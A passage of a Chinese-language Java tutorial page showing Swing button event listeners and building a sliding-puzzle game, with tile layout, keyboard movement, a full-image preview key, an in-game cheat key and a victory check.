jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        jFrame.setLayout(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个按钮对象</span></span><br><span class="line">        <span class="type">JButton</span> <span class="variable">jtb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;点我啊&quot;</span>);</span><br><span class="line">        <span class="comment">//设置位置和宽高</span></span><br><span class="line">        jtb.setBounds(<span class="number">0</span>,<span class="number">0</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">        <span class="comment">//给按钮添加动作监听</span></span><br><span class="line">        <span class="comment">//jtb:组件对象，表示你要给哪个组件添加事件</span></span><br><span class="line">        <span class="comment">//addActionListener：表示我要给组件添加哪个事件监听（动作监听包含鼠标左键点击，空格）</span></span><br><span class="line">        <span class="comment">//参数：表示事件被触发之后要执行的代码</span></span><br><span class="line">        jtb.addActionListener(<span class="keyword">new</span> <span class="title class_">MyActionListener</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把按钮添加到界面当中</span></span><br><span class="line">        jFrame.getContentPane().add(jtb);</span><br><span class="line"></span><br><span class="line">        jFrame.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyActionListener</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;按钮被点击了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="方式二：匿名内部类"><a class="header-anchor" href="#方式二：匿名内部类">¶</a>方式二：匿名内部类</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">jFrame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>();</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        jFrame.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        jFrame.setTitle(<span class="string">&quot;事件演示&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        jFrame.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        jFrame.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        jFrame.setLayout(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个按钮对象</span></span><br><span class="line">        <span class="type">JButton</span> <span class="variable">jtb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;点我啊&quot;</span>);</span><br><span class="line">        <span class="comment">//设置位置和宽高</span></span><br><span class="line">        jtb.setBounds(<span class="number">0</span>,<span class="number">0</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">        <span class="comment">//给按钮添加动作监听</span></span><br><span class="line">        <span class="comment">//jtb:组件对象，表示你要给哪个组件添加事件</span></span><br><span class="line">        <span class="comment">//addActionListener：表示我要给组件添加哪个事件监听（动作监听包含鼠标左键点击，空格）</span></span><br><span class="line">        <span class="comment">//参数：表示事件被触发之后要执行的代码</span></span><br><span class="line"></span><br><span class="line">        jtb.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;达咩~不要点我哟~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//把按钮添加到界面当中</span></span><br><span class="line">        jFrame.getContentPane().add(jtb);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        jFrame.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="方式三：本类实现接口"><a class="header-anchor" href="#方式三：本类实现接口">¶</a>方式三：本类实现接口</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个按钮对象</span></span><br><span class="line">    <span class="type">JButton</span> <span class="variable">jtb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;点我啊&quot;</span>);</span><br><span class="line">    <span class="comment">//创建一个按钮对象</span></span><br><span class="line">    <span class="type">JButton</span> <span class="variable">jtb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;再点我啊&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyJFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//给按钮设置位置和宽高</span></span><br><span class="line">        jtb1.setBounds(<span class="number">0</span>,<span class="number">0</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">        <span class="comment">//给按钮添加事件</span></span><br><span class="line">        jtb1.addActionListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//给按钮设置位置和宽高</span></span><br><span class="line">        jtb2.setBounds(<span class="number">100</span>,<span class="number">0</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">        jtb2.addActionListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//那按钮添加到整个界面当中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(jtb1);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(jtb2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//让整个界面显示出来</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">//对当前的按钮进行判断</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取当前被操作的那个按钮对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">source</span> <span class="operator">=</span> e.getSource();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(source == jtb1)&#123;</span><br><span class="line">            jtb1.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(source == jtb2)&#123;</span><br><span class="line">            <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">            jtb2.setLocation(r.nextInt(<span class="number">500</span>),r.nextInt(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure>
<h2 id="Day17-面向对象综合练习（下）-拼图游戏"><a class="header-anchor" href="#Day17-面向对象综合练习（下）-拼图游戏">¶</a>Day17 面向对象综合练习（下）-- 拼图游戏</h2>
<h3 id="美化界面"><a class="header-anchor" href="#美化界面">¶</a>美化界面</h3>
<ol>
<li>将15张小图片移动到界面的中央偏下方</li>
<li>添加背景图片</li>
<li>添加图片的边框</li>
<li>优化路径</li>
</ol>
<h4 id="小图片居中"><a class="header-anchor" href="#小图片居中">¶</a>小图片居中</h4>
<ul>
<li>设计让图片居中</li>
<li>这样需要给每张图片在x和y都进行一个偏移</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">        <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(path + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//指定图片位置，并进行适当的偏移</span></span><br><span class="line">        jLabel.setBounds(<span class="number">105</span> * j + <span class="number">83</span>, <span class="number">105</span> * i + <span class="number">134</span>, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">        <span class="comment">//给图片添加边框</span></span><br><span class="line">        <span class="comment">//0:表示让图片凸起来</span></span><br><span class="line">        <span class="comment">//1：表示让图片凹下去</span></span><br><span class="line">        jLabel.setBorder(<span class="keyword">new</span> <span class="title class_">BevelBorder</span>(BevelBorder.LOWERED));</span><br><span class="line">        <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="添加背景图片"><a class="header-anchor" href="#添加背景图片">¶</a>添加背景图片</h4>
<ul>
<li>细节：代码中后添加的，塞在下方</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">        <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">        <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;F:\\JavaSE最新版\\day17-面向对象综合练习（下）\\代码\\&quot;</span> + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">        <span class="comment">//指定图片位置</span></span><br><span class="line">        jLabel.setBounds(<span class="number">105</span> * j + <span class="number">83</span>, <span class="number">105</span> * i + <span class="number">134</span>, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">        <span class="comment">//给图片添加边框</span></span><br><span class="line">        <span class="comment">//0:表示让图片凸起来</span></span><br><span class="line">        <span class="comment">//1：表示让图片凹下去</span></span><br><span class="line">        jLabel.setBorder(<span class="keyword">new</span> <span class="title class_">BevelBorder</span>(BevelBorder.LOWERED));</span><br><span class="line">        <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加背景图片</span></span><br><span class="line"><span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;F:\JavaSE最新版\day17-面向对象综合练习（下）\代码\puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line"><span class="comment">//把背景图片添加到界面当中</span></span><br><span class="line"><span class="built_in">this</span>.getContentPane().add(background);</span><br></pre></td></tr></table></figure>
<h4 id="添加图片的边框"><a class="header-anchor" href="#添加图片的边框">¶</a>添加图片的边框</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给图片添加边框</span></span><br><span class="line"><span class="comment">//括号中也可以写0或者1</span></span><br><span class="line"><span class="comment">//要注意，这个凸凹跟大家自己理解的可能会有偏差</span></span><br><span class="line"><span class="comment">//0:表示让图片凸起来，图片凸起来，边框就会凹下去</span></span><br><span class="line"><span class="comment">//1：表示让图片凹下去，图片凹下去，边框就会凸起来</span></span><br><span class="line"><span class="comment">//但是0和1不好记，所以Java中就定义了常亮表示，方便记忆</span></span><br><span class="line"><span class="comment">//BevelBorder.LOWERED：表示1</span></span><br><span class="line"><span class="comment">//BevelBorder.RAISED：表示0</span></span><br><span class="line">jLabel.setBorder(<span class="keyword">new</span> <span class="title class_">BevelBorder</span>(BevelBorder.LOWERED));</span><br></pre></td></tr></table></figure>
<h4 id="优化路径"><a class="header-anchor" href="#优化路径">¶</a>优化路径</h4>
<ul>
<li>之前写的完整路径：<code>F:\JavaSE最新版\day17-面向对象综合练习（下）\代码\puzzlegame\image\animal\animal3\1.jpg</code>
<ul>
<li>坏处1：路径太长，阅读不方便</li>
<li>坏处2：项目非本地运行时，如果环境中没有对应文件夹，就找不到图片资源</li>
</ul>
</li>
</ul>
<h5 id="计算机中的两种路径"><a class="header-anchor" href="#计算机中的两种路径">¶</a>计算机中的两种路径</h5>
<ul>
<li>
<p>绝对路径&amp;相对路径</p>
</li>
<li>
<p>目前在idea中，相对路径时相对当前项目而言</p>
</li>
<li>
<p>例：<code>aaa\\bbb\\a.txt</code>，先找当前项目，在当前项目下找aaa，在aaa里面找bbb，在bbb里面找a.txt</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将之前项目的绝对路径改写为相对路径</span></span><br><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line"><span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line"><span class="comment">// 把背景图片添加到界面当中</span></span><br><span class="line"><span class="built_in">this</span>.getContentPane().add(background);</span><br></pre></td></tr></table></figure>
<h3 id="上下左右移动的逻辑"><a class="header-anchor" href="#上下左右移动的逻辑">¶</a>上下左右移动的逻辑</h3>
<h4 id="业务分析"><a class="header-anchor" href="#业务分析">¶</a>业务分析</h4>
<ul>
<li>
<p>上下左右的我们看上去就是移动空白的方块，实则逻辑跟我们看上去的相反：</p>
<ul>
<li>上移：是把空白区域下方的图片上移。</li>
<li>下移：是把空白区域上方的图片下移。</li>
<li>左移：是把空白区域右方的图片左移。</li>
<li>右移：是把空白区域左方的图片右移。</li>
</ul>
</li>
<li>
<p>移动时需要注意的问题</p>
<ul>
<li>如果空白区域已经在最上面了，此时x=0，那么就无法再下移了。</li>
<li>如果空白区域已经在最下面了，此时x=3，那么就无法再上移了。</li>
<li>如果空白区域已经在最左侧了，此时y=1，那么就无法再右移了。</li>
<li>如果空白区域已经在最右侧了，此时y=3，那么就无法再左移了。</li>
</ul>
</li>
</ul>
<h4 id="实现步骤"><a class="header-anchor" href="#实现步骤">¶</a>实现步骤</h4>
<ol>
<li>本类实现KeyListener接口，并重写所有抽象方法</li>
<li>给整个界面添加键盘监听事件</li>
<li>统计一下空白方块对应的数字0在二维数组中的位置</li>
<li>在keyReleased方法当中实现移动的逻辑</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//松开按键的时候会调用这个方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyReleased</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">    <span class="comment">//对上，下，左，右进行判断</span></span><br><span class="line">    <span class="comment">//左：37 上：38 右：39 下：40</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">    <span class="keyword">if</span> (code == <span class="number">37</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;向左移动&quot;</span>);</span><br><span class="line">        <span class="comment">//逻辑：</span></span><br><span class="line">        <span class="comment">//把空白方块右方的数字往左移动</span></span><br><span class="line">        data[x][y] = data[x][y + <span class="number">1</span>];</span><br><span class="line">        data[x][y + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        y++;</span><br><span class="line">        <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">        initImage();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">38</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;向上移动&quot;</span>);</span><br><span class="line">        <span class="comment">//逻辑：</span></span><br><span class="line">        <span class="comment">//把空白方块下方的数字往上移动</span></span><br><span class="line">        <span class="comment">//x，y  表示空白方块</span></span><br><span class="line">        <span class="comment">//x + 1， y 表示空白方块下方的数字</span></span><br><span class="line">        <span class="comment">//把空白方块下方的数字赋值给空白方块</span></span><br><span class="line">        data[x][y] = data[x + <span class="number">1</span>][y];</span><br><span class="line">        data[x + <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">        x++;</span><br><span class="line">        <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">        initImage();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">39</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;向右移动&quot;</span>);</span><br><span class="line">        <span class="comment">//逻辑：</span></span><br><span class="line">        <span class="comment">//把空白方块左方的数字往右移动</span></span><br><span class="line">        data[x][y] = data[x][y - <span class="number">1</span>];</span><br><span class="line">        data[x][y - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        y--;</span><br><span class="line">        <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">        initImage();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">40</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;向下移动&quot;</span>);</span><br><span class="line">        <span class="comment">//逻辑：</span></span><br><span class="line">        <span class="comment">//把空白方块上方的数字往下移动</span></span><br><span class="line">        data[x][y] = data[x - <span class="number">1</span>][y];</span><br><span class="line">        data[x - <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">        x--;</span><br><span class="line">        <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">        initImage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查看完整图片"><a class="header-anchor" href="#查看完整图片">¶</a>查看完整图片</h3>
<h4 id="业务分析-v2"><a class="header-anchor" href="#业务分析-v2">¶</a>业务分析</h4>
<ul>
<li>在玩游戏的过程中，我想看一下最终的效果图，该怎么办呢？</li>
<li>此时可以添加一个功能，当我们长按某个键（假设为A），不松的时候，就显示完整图片，松开就显示原来的图片</li>
</ul>
<h4 id="实现步骤-v2"><a class="header-anchor" href="#实现步骤-v2">¶</a>实现步骤</h4>
<ol>
<li>给整个界面添加键盘事件</li>
<li>在keyPressed中书写按下不松的逻辑</li>
<li>在keyReleased中书写松开的逻辑</li>
</ol>
<h4 id="代码实现"><a class="header-anchor" href="#代码实现">¶</a>代码实现</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//按下不松时会调用这个方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyPressed</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">    <span class="keyword">if</span> (code == <span class="number">65</span>)&#123;  <span class="comment">// 把按键信息转换为ASCII码值</span></span><br><span class="line">        <span class="comment">//把界面中所有的图片全部删除</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line">        <span class="comment">//加载第一张完整的图片</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">all</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(path + <span class="string">&quot;all.jpg&quot;</span>));</span><br><span class="line">        all.setBounds(<span class="number">83</span>,<span class="number">134</span>,<span class="number">420</span>,<span class="number">420</span>);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(all);</span><br><span class="line">        <span class="comment">//加载背景图片</span></span><br><span class="line">        <span class="comment">//添加背景图片</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">        background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line">        <span class="comment">//把背景图片添加到界面当中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(background);</span><br><span class="line">        <span class="comment">//刷新界面</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().repaint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//松开按键的时候会调用这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyReleased</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">65</span>)&#123;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="作弊码"><a class="header-anchor" href="#作弊码">¶</a>作弊码</h3>
<h4 id="业务分析-v3"><a class="header-anchor" href="#业务分析-v3">¶</a>业务分析</h4>
<p>不想玩了，想要一键通关</p>
<h4 id="实现步骤-v3"><a class="header-anchor" href="#实现步骤-v3">¶</a>实现步骤</h4>
<ol>
<li>给整个界面添加键盘事件</li>
<li>在keyReleased中书写松开的逻辑，当按下W的时候一键通关。</li>
</ol>
<ul>
<li>**备注：**可以改写这段逻辑，当按下W的时候，可以将数据排列成还需要走这么两三步才能一键通关的，这样你在跟好基友PK的时候，操作是不是更加隐秘呢？</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//松开按键的时候会调用这个方法</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyReleased</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">87</span>)&#123;</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">                &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">                &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">                &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>&#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断胜利"><a class="header-anchor" href="#判断胜利">¶</a>判断胜利</h3>
<h4 id="业务逻辑"><a class="header-anchor" href="#业务逻辑">¶</a>业务逻辑</h4>
<ul>
<li>当游戏的图标排列正确了，需要有胜利图标显示。</li>
<li>每次上下左右移动图片的时候都需要进行判断。</li>
<li>在keyReleased中方法一开始的地方就需要写判断是否胜利</li>
</ul>
<h4 id="实现步骤-v4"><a class="header-anchor" href="#实现步骤-v4">¶</a>实现步骤</h4>
<ol>
<li>定义一个正确的二维数组win。</li>
<li>在加载图片之前，先判断一下二维数组中的数字跟win数组中是否相同。</li>
<li>如果相同展示正确图标</li>
<li>如果不同则不展示正确图标</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">KeyListener</span>,ActionListener&#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">//定义一个二维数组，存储正确的数据</span></span><br><span class="line">        <span class="type">int</span>[][] win = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;,</span><br><span class="line">        &#123;<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initImage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//清空原本已经出现的所有图片</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (victory()) &#123;</span><br><span class="line">            <span class="comment">//显示胜利的图标</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">winJLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;C:\\Users\\moon\\IdeaProjects\\basic-code\\puzzlegame\\image\\win.png&quot;</span>));</span><br><span class="line">            winJLabel.setBounds(<span class="number">203</span>,<span class="number">283</span>,<span class="number">197</span>,<span class="number">73</span>);</span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(winJLabel);</span><br><span class="line">        &#125;   </span><br><span class="line">        ...</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断data数组中的数据是否跟win数组中相同</span></span><br><span class="line">    <span class="comment">//如果全部相同，返回true。否则返回false</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">victory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="comment">//i : 依次表示二维数组 data里面的索引</span></span><br><span class="line">            <span class="comment">//data[i]：依次表示每一个一维数组</span></span><br><span class="line">            <span 